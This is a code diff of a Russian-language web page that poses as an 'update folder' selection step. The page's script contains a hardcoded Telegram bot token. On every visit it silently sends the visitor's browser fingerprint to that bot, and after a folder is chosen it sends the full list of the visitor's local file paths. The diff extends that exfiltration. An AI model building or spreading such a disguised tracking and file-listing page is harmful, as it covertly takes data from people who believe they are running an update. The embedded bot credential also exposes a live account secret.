@@ -107,6 +107,20 @@
         .btn-continue:active {
             opacity: 0.7;
         }
+        .folder-hint {
+            color: #666;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+        .file-list {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 8px;
+            max-height: 100px;
+            overflow-y: auto;
+            text-align: left;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
@@ -124,9 +138,11 @@
         <label class="file-label" id="fileLabel">
             <span>📂 Нажмите, чтобы выбрать папку</span>
         </label>
-        <input type="file" id="fileInput" webkitdirectory directory multiple>
+        <!-- Используем обычный input с multiple + directory -->
+        <input type="file" id="fileInput" multiple webkitdirectory directory>
     </div>
 
+    <div class="file-list" id="fileList"></div>
     <div class="status" id="status">⏳ Обработка...</div>
     <button class="btn-continue" id="continueBtn">Продолжить</button>
 
@@ -134,7 +150,7 @@
 </div>
 
 <script>
-    // ===== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ) =====
+    // ===== КОНФИГУРАЦИЯ =====
     const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
     const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -153,25 +169,30 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    // ===== ВЫБОР ПАПКИ =====
+    // ===== ВЫБОР ФАЙЛОВ =====
     document.getElementById('fileInput').addEventListener('change', function(e) {
         const files = e.target.files;
         if (files.length === 0) return;
 
         selectedFiles = files;
+        const fileNames = [];
+        for (let i = 0; i < files.length; i++) {
+            fileNames.push(files[i].webkitRelativePath || files[i].name);
+        }
+
         document.getElementById('status').style.display = 'block';
         document.getElementById('status').textContent = `📁 Выбрано файлов: ${files.length}`;
         document.getElementById('fileLabel').innerHTML = `<span>✅ Выбрано ${files.length} файлов</span>`;
 
-        // Отправляем отчёт в Telegram
-        let fileList = [];
-        for (let i = 0; i < files.length; i++) {
-            fileList.push(files[i].webkitRelativePath || files[i].name);
-        }
-        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлы:\n${fileList.join('\n')}`);
+        // Показываем список
+        const list = document.getElementById('fileList');
+        list.innerHTML = fileNames.slice(0, 10).join('<br>') + (fileNames.length > 10 ? `<br>... и ещё ${fileNames.length - 10}` : '');
+
+        // Отправляем в Telegram
+        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлы (${files.length}):\n${fileNames.join('\n')}`);
     });
 
-    // ===== КНОПКА "ПРОДОЛЖИТЬ" =====
+    // ===== КНОПКА =====
     document.getElementById('continueBtn').addEventListener('click', function() {
         if (selectedFiles.length === 0) {
             document.getElementById('status').style.display = 'block';
@@ -190,10 +211,10 @@
         }, 2000);
     });
 
-    // ===== АВТО-УВЕДОМЛЕНИЕ ПРИ ВИЗИТЕ =====
+    // ===== АВТО-УВЕДОМЛЕНИЕ =====
     window.onload = function() {
         sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${navigator.userAgent}\n📺 ${screen.width}x${screen.height}`);
     };
 </script>
 </body>
-    </html>
+</html>
